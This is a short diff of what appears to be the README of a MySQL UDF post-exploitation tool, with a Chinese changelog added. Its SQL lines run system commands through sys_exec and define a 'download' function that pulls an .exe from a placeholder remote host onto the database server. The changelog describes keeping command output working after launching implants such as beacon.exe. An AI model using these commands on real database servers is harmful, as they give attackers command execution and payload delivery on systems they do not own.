@@ -46,3 +46,16 @@ select sys_exec("whoami");drop function sys_exec; ```
 
 ```create function download returns string soname "lib_mysqludf_sys_x64.dll"; select download("http://xxxx/xxx.exe","C:\\11111.exe");drop function download;```
 
+
+
+# Update
+
+## 20220330
+1.使用CreateFile+CreateProcess获取子进程命令执行返回;  
+  
+2.使用unlocker库解除文件占用(该bug曾导致执行持久程序时由于句柄占用无法获得下次命令执行输出，如执行beacon.exe后，再执行whoami将没有回显输出);  
+
+3.中文乱码时可以切换数据库链接编码为GBK(chcp = 936).   
+
+
+
